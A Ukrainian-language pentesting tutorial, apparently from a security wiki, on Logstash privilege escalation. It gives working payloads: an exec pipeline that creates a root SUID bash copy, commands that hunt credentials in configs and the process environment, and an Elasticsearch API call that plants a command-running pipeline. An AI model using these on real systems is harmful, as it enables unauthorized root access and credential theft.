# Підвищення привілеїв Logstash

## Logstash

Logstash використовується для **збирання, трансформації та надсилання логів** через систему, відому як **pipelines**. Ці pipelines складаються з етапів **input**, **filter** та **output**.<sup>[[4]](#references)</sup> Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Конфігурація pipeline

У разі встановлення пакетів Debian і RPM pipelines налаштовуються через **/etc/logstash/pipelines.yml**, де перелічено розташування конфігурацій pipeline; інші дистрибутиви розміщують `pipelines.yml` у каталозі Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Цей файл показує, де розташовані **.conf**-файли, що містять конфігурації pipeline. Під час використання **Elasticsearch output** перевірте його параметри `user`/`password`, `cloud_auth` або `api_key`; ефективні привілеї облікового запису залежать від Elasticsearch. Glob-шаблон `path.config` завантажує кожен файл, що відповідає шаблону, для цього pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Якщо Logstash запущено з `-f <directory>` замість `pipelines.yml`, параметр `-f` має пріоритет, а **всі файли всередині цього каталогу об'єднуються в лексикографічному порядку та аналізуються як єдина конфігурація**.<sup>[[6]](#references)[[7]](#references)</sup> Це створює 2 offensive implications:

- Доданий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити спосіб складання підсумкового pipeline
- Некоректний файл може спричинити помилку перевірки об'єднаної конфігурації; під час перезавантаження Logstash зберігає попередній pipeline, тому перевіряйте payloads перед тим, як покладатися на auto-reload.<sup>[[1]](#references)</sup>

### Швидке перерахування на скомпрометованому хості

На хості, де встановлено Logstash, швидко перевірте:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Також перевірте, чи доступний локальний monitoring API. За замовчуванням він прив’язаний до **127.0.0.1:9600**, чого зазвичай достатньо після потрапляння на хост.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ці endpoints розкривають ID і налаштування pipeline, runtime-метрики та лічильники успішних/невдалих перезавантажень конфігурації, допомагаючи підтвердити, чи було прийнято зміну.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Якщо отриманий credential націлений на **Elasticsearch**, перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Підвищення привілеїв через доступні для запису pipeline

Щоб спробувати підвищити привілеї, спочатку визначте користувача, від імені якого фактично працює сервіс Logstash; не припускайте, що це root або користувач **logstash**. Переконайтеся, що виконується **один** із цих критеріїв:

- Маєте **доступ на запис** до файлу pipeline **.conf** **або**
- У файлі **/etc/logstash/pipelines.yml** використовується wildcard, і ви можете записувати до цільової папки.<sup>[[6]](#references)[[7]](#references)</sup>

Крім того, має виконуватися **одна** з цих умов:

- Є можливість перезапустити сервіс Logstash **або**
- У файлі **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Якщо в конфігурації використовується wildcard, створення файлу, що відповідає цьому wildcard, дає змогу виконувати команди.<sup>[[7]](#references)[[9]](#references)</sup> Наприклад:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** запускається кожні 120 секунд, а її вивід перенаправляється до **/tmp/output.log**.<sup>[[9]](#references)</sup>

Якщо в **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**, Logstash автоматично виявлятиме та застосовуватиме нові або змінені конфігурації pipeline без потреби в перезапуску.<sup>[[1]](#references)[[15]](#references)</sup> Якщо wildcard відсутній, наявні конфігурації все одно можна змінювати, але слід бути обережним, щоб уникнути збоїв.

### Надійніші Pipeline Payloads

Плагін введення `exec` усе ще працює в поточних релізах і потребує або `interval`, або `schedule`. Він виконує операцію шляхом **forking** JVM Logstash, тому за нестачі пам’яті ваш payload може завершитися з помилкою `ENOMEM`, а не запуститися непомітно.<sup>[[9]](#references)</sup>

Якщо service має достатні privileges для створення SUID-файлу, власником якого є root, практичний payload для privilege escalation — це payload, який залишає довговічний артефакт:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Якщо у вас немає прав на перезапуск, але ви можете надіслати сигнал процесу, Logstash також підтримує перезавантаження через **SIGHUP** у Unix-подібних системах:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Майте на увазі, що не кожен plugin підтримує reload. Наприклад, input **stdin** запобігає автоматичному reload, тож не припускайте, що `config.reload.automatic` завжди підхопить ваші зміни.<sup>[[1]](#references)</sup>

### Викрадення секретів із Logstash

Перш ніж зосереджуватися лише на виконанні коду, зберіть дані, до яких Logstash уже має доступ:

- Облікові дані можуть бути вказані у виходах `elasticsearch {}`, URL/налаштуваннях `http_poller`, JDBC inputs або налаштуваннях, пов’язаних із cloud; ці plugins містять поля облікових даних, які варто перевірити.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Захищені налаштування можуть зберігатися у **`/etc/logstash/logstash.keystore`** або в іншому каталозі `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Пароль keystore може передаватися через **`LOGSTASH_KEYSTORE_PASS`**, а RPM/DEB-інсталяції отримують змінні середовища сервісу з **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Розгортання змінних середовища за допомогою `${VAR}` виконується під час запуску Logstash, тому середовище сервісу варто перевірити.<sup>[[14]](#references)</sup>

Корисні перевірки:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Це також варто перевірити, оскільки **CVE-2023-46672** показала, що за певних обставин Logstash записував конфіденційну інформацію до своїх логів, зокрема секрети, що зберігалися в його keystore і використовувалися з конфігурації; перевірте старі логи Logstash і записи `journald`, якщо ці обставини могли мати місце.<sup>[[3]](#references)</sup>

### Зловживання централізованим керуванням Pipeline

У деяких середовищах host **не** використовує локальні `.conf`-файли взагалі. Якщо налаштовано **`xpack.management.enabled: true`**, Logstash може отримувати централізовано керовані pipelines з Elasticsearch/Kibana, і після ввімкнення цього режиму локальні конфігурації pipelines більше не є джерелом істини.<sup>[[2]](#references)</sup>

Це означає наявність іншого шляху атаки:

1. Отримайте Elastic credentials із локальних налаштувань Logstash, keystore або логів.<sup>[[3]](#references)[[10]](#references)</sup>
2. Перевірте, чи має обліковий запис кластерний привілей **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Створіть або замініть централізовано керований pipeline, щоб host Logstash виконав ваш payload під час наступного інтервалу опитування.<sup>[[2]](#references)[[16]](#references)</sup>

API Elasticsearch, який використовується для цієї функції:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash уже зареєстрований для віддаленого отримання pipeline.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Перезавантаження конфігураційного файлу](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Налаштування централізованого керування pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Оновлення безпеки Logstash 8.11.1 (ESA-2023-26) — CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Створення pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Структура каталогів Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Кілька pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Запуск Logstash з командного рядка](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Моніторинг Logstash за допомогою API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Вхідний plugin Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore секретів для захищених налаштувань](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Вихідний plugin Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Вхідний plugin Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Вхідний plugin Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Використання змінних середовища](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Створення або оновлення pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Отримання налаштувань для pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Отримання статистики для pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
